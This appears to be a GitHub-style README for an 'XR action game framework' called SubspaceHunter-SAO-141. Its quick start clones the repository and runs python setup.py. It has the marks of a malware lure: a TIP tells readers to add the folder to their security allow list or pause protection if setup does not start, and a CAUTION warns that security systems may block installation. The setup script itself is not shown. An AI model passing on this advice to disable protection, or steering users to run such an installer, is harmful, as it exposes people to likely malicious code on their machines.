# SubspaceHunter-SAO-141

一个开源可商用的XR动作游戏开源框架以及美术资产，灵感来源于SAO ；An open-source and commercially viable framework for XR action games, along with art assets, inspired by SAO.


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/segmentjoninsecret/SubspaceHunter-SAO-141.git
cd SubspaceHunter-SAO-141
python setup.py
```
